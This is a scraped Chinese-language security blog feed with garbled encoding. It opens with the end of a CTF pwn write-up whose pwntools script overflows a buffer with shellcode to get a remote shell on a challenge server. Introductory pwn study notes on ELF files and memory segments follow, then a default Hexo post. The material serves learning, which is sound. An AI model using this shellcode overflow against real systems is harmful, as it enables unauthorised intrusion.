class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io = remote(&lt;span class=&#34;string&#34;&gt;&amp;quot;node5.anna.nssctf.cn&amp;quot;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;28172&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.arch = &lt;span class=&#34;string&#34;&gt;&amp;quot;amd64&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shellcode = asm(shellcraft.amd64.sh())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;buff = &lt;span class=&#34;number&#34;&gt;0x4040A0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = shellcode.ljust(&lt;span class=&#34;number&#34;&gt;0x108&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;A&amp;#x27;&lt;/span&gt;) + p64(buff)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;ТюђтљјТѕљтіЪТІ┐тѕ░уЏ«ТаЄ shell№╝џ&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/direct/52851acf64c0452f9dcff98caec859a4.png#pic_center&#34; alt=&#34;тюеУ┐ЎжЄїТЈњтЁЦтЏЙуЅЄТЈЈУ┐░&#34;&gt;&lt;/p&gt;

 &lt;h1 id=&#34;pwnтГдС╣аугћУ«░1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pwnтГдС╣аугћУ«░1&#34;&gt;#&lt;/a&gt; pwn тГдС╣аугћУ«░№╝ѕ1№╝Ѕ&lt;/h1&gt;
&lt;h2 id=&#34;1pwnу«ђС╗І&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1pwnу«ђС╗І&#34;&gt;#&lt;/a&gt; №╝ѕ1№╝Ѕpwn у«ђС╗І№╝џ&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;	С╗ЦСИІТЮЦУЄфС║јуЎЙт║дуЎЙуДЉ№╝џРђЮPwnРђЮТў»СИђСИфж╗Љт«бУ»ГТ│ЋуџёС┐џУ»ГУ»Ї№╝їТў»ТїЄТћ╗уа┤У«ЙтцЄТѕќУђЁу│╗у╗ЪтЈЉжЪ│у▒╗С╝╝Рђюуа░РђЮ№╝їт»╣ж╗Љт«бУђїУеђ№╝їУ┐Ўт░▒Тў»ТѕљтіЪт«ъТќйж╗Љт«бТћ╗тЄ╗уџётБ░жЪ│РђћРђћуа░уџёСИђтБ░№╝їУбФРђюж╗ЉРђЮуџёућхУёЉТѕќТЅІТю║т░▒УбФСйаТЊЇу║хС║є сђѓ
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;2тЄаСИфу«ђтЇЋуџётљЇУ»Ї&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2тЄаСИфу«ђтЇЋуџётљЇУ»Ї&#34;&gt;#&lt;/a&gt; №╝ѕ2№╝ЅтЄаСИфу«ђтЇЋуџётљЇУ»Ї№╝џ&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;	exploit№╝џућеС║јТћ╗тЄ╗уџёУёџТюгСИјТќ╣ТАѕ

	payload№╝џТћ╗тЄ╗УййУЇи№╝їТў»т»╣уЏ«ТаЄУ┐ЏуеІтіФТїЂТјДтѕХТхЂуџёТЋ░ТЇ«

	shellcode№╝џУ░ЃућеТћ╗тЄ╗уЏ«ТаЄуџёshellС╗БуаЂ№╝їтИИУДЂуџёТюЅbashтњїsh
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;3cТ║љС╗БуаЂтѕ░тЈ»ТЅДУАїТќЄС╗Х&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3cТ║љС╗БуаЂтѕ░тЈ»ТЅДУАїТќЄС╗Х&#34;&gt;#&lt;/a&gt; №╝ѕ3№╝ЅC Т║љС╗БуаЂтѕ░тЈ»ТЅДУАїТќЄС╗Х№╝џ&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;	тдѓСИІтЏЙТЅђуц║№╝џ
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2024/05/21/IrRs7DdMKH5i2be.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;	CТ║љС╗БуаЂу╗ЈУ┐Єу╝ќУ»ЉТѕљСИ║Т▒Єу╝ќС╗БуаЂ№╝їТ▒Єу╝ќС╗БуаЂтєЇу╗ЈУ┐ЄТ▒Єу╝ќТѕљСИ║Тю║тЎеуаЂ№╝їтЇ│ућЪТѕљСИђСИфelf№╝ѕС║їУ┐ЏтѕХ№╝ЅуЏ«ТаЄТќЄС╗Х№╝їУ┐ЏУАїжЊЙТјЦтљјТѕљСИ║elfтЈ»ТЅДУАїТќЄС╗Х№╝џ
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2024/05/21/NLbaZoejBP1lyHd.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;4тЈ»ТЅДУАїТќЄС╗Х&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4тЈ»ТЅДУАїТќЄС╗Х&#34;&gt;#&lt;/a&gt; №╝ѕ4) тЈ»ТЅДУАїТќЄС╗Х№╝џ&lt;/h2&gt;
&lt;p&gt;1.Windows№╝џPE&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;тЈ»ТЅДУАїуеІт║Ј  .exe

тіеТђЂжЊЙТјЦт║Њ  .dll

жЮЎТђЂжЊЙТјЦт║Њ  .lib
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;2.Linux№╝џELF&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;тЈ»ТЅДУАїуеІт║Ј  .out

тіеТђЂжЊЙТјЦт║Њ  .so

жЮЎТђЂжЊЙТјЦт║Њ  .a
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;5elfТќЄС╗ХС┐АТЂ»&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#5elfТќЄС╗ХС┐АТЂ»&#34;&gt;#&lt;/a&gt; №╝ѕ5№╝ЅELF ТќЄС╗ХС┐АТЂ»№╝џ&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;№╝ѕ1№╝ЅТ«хУДєтЏЙ№╝џтюетєЁтГўСИГуеІт║ЈтіаУййтѕ░тєЁтГўТѕљСИ║СИђСИфУ┐ЏуеІтљј№╝їУ┐ЏУАїУ»╗тєЎсђЂТЅДУАїТЮЃжЎљтѕњтѕєуџёУДєтЏЙ№╝ЏУіѓУДєтЏЙ№╝џТў»СИђСИфelfТќЄС╗Х№╝їтГўТћЙтюеуБЂуЏўСИГ№╝їУ┐ЏУАїСИЇтљїтіЪУЃйтї║тЪЪтѕњтѕєуџёУДєтЏЙ

№╝ѕ2№╝ЅcodeУіѓтїЁтљФуџётєЁт«╣Тў»Тю║тЎеуаЂсђѓСИЇтљїуџётѕєтї║ТюЅСИЇтљїуџётіЪУЃй№╝їТа╣ТЇ«СИЇтљїуџётіЪУЃйУбФтѕњтѕєТѕљСИЇтљїуџёС╗БуаЂУіѓсђѓ

№╝ѕ3№╝ЅСИЇтљїуџёУіѓтЈ»УЃйт▒ъС║јСИђСИфТ«хсђѓтцџСИфУіѓтЈ»С╗Цтљѕт╣ХТѕљСИђСИфТ«х№╝їТ«хтюеelfТќЄС╗ХтіаУййтѕ░У┐ЏуеІтљјУхиСйюућесђѓ
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2024/05/21/hQG4JDngTEmpskR.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;6уеІт║ЈУБЁтюеСИјУЎџТІЪтєЁтГў&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#6уеІт║ЈУБЁтюеСИјУЎџТІЪтєЁтГў&#34;&gt;#&lt;/a&gt; №╝ѕ6№╝ЅуеІт║ЈУБЁтюеСИјУЎџТІЪтєЁтГў№╝џ&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;	уАгуЏўСИГуџёELFТќЄС╗Хтюетљ»тіеуџёТЌХтђЎ№╝їС╝џУбФУБЁУййтѕ░тєЁтГўСИГтйбТѕљСИђСИфУЎџТІЪТўатЃЈ№╝їтљїТЌХ№╝їELFСИГуЏИт║ћуџёУіѓС╝џу╗ётљѕтюеСИђУхиТѕљСИ║СИђСИфСИфСИфТ«х№╝џ
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2024/05/21/HtdbrK4Psmk2JuE.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;	т»╣С║ј32СйЇуџёELFТќЄС╗Х№╝їТЊЇСйюу│╗у╗ЪС╝џтюеУБЁУййуџёТЌХтђЎтѕєтЄ║4GуџёУЎџТІЪтєЁтГўуЕ║жЌ┤№╝їтљїТЌХ№╝їТюђжФўСйЇтю░тЮђжѓБ1Gт▒ъС║јтєЁТаИуЕ║жЌ┤№╝їућеТЮЦтГўТћЙСИђС║ЏтєЁТаИуџёС╗БуаЂ№╝їУђїтЅЕСИІуџё3Gт▒ъС║јућеТѕиуЕ║жЌ┤№╝їућеТѕиуЕ║жЌ┤Тў»тљёУЄфуІгуФІуџё№╝їСйєтєЁТаИуЕ║жЌ┤Тў»тЁ▒С║Фуџё№╝їтюеуЅЕуљєтєЁтГўСИГтЈфжюђУдЂтГўтюеСИђС╗йтЇ│тЈ»
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2024/05/21/ovrHZ6SwsRGqn1a.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;	т»╣С║јСИђСИфУЎџТІЪтєЁтГўУђїУеђтГўтюетЙѕтцџСИфТ«х№╝џ

	1.BssТ«х№╝џућеС║јтГўТћЙТюфтѕЮтДІтїќуџётЁет▒ђтЈўжЄЈ№╝їТюфтѕЮтДІтїќуџётЁет▒ђтЈўжЄЈтЇаућетєЁтГўуЕ║жЌ┤№╝їСИЇтЇаућеуБЂуЏўуЕ║жЌ┤

	2.TextТ«х№╝џтГўТћЙтЈфУ»╗СИЇтєЎуџёТЋ░ТЇ«тњїтЄйТЋ░

	3.StackТ«х№╝џућеС║јтГўТћЙт▒ђжЃетЈўжЄЈС╗ЦтЈітЄйТЋ░уџёТаѕтИД
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;7тцДуФ»т║ЈСИјт░ЈуФ»т║Ј&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#7тцДуФ»т║ЈСИјт░ЈуФ»т║Ј&#34;&gt;#&lt;/a&gt; №╝ѕ7№╝ЅтцДуФ»т║ЈСИјт░ЈуФ»т║Ј№╝џ&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2024/05/21/ncKRAiSZkhGf36B.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;

 &lt;p&gt;Welcome to &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvLw==&#34;&gt;Hexo&lt;/span&gt;! This is your very first post. Check &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3Mv&#34;&gt;documentation&lt;/span&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3MvdHJvdWJsZXNob290aW5nLmh0bWw=&#34;&gt;troubleshooting&lt;/span&gt; or you can ask me on &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2hleG9qcy9oZXhvL2lzc3Vlcw==&#34;&gt;GitHub&lt;/span&gt;.&lt;/p&gt;
